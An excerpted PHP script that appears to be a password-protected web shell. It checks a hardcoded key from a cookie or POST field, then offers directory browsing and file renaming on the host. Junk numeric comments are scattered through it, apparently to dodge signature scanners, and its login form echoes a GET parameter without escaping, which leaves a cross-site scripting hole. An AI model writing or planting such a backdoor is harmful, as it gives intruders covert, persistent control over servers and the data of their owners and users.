...
$auth_key = "e00839010d01433df551334e2cbad45e";
...
$pass = false;
if (isset($_COOKIE['pw_name_37743'])) {
    if(($_COOKIE['pw_name_37743']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_37743'])) {
        if(($_POST['pw_name_37743']) == $auth_key) {
            setcookie("pw_name_37743", $_POST['pw_name_37743']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_37743' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774179106 1724682774981067 1724682774766304 1724682774344371
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774179106 1724682774981067 1724682774766304 1724682774344371
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774179106 1724682774981067 1724682774766304 1724682774344371
            $name = PATH . "/" . $_GET['r'];
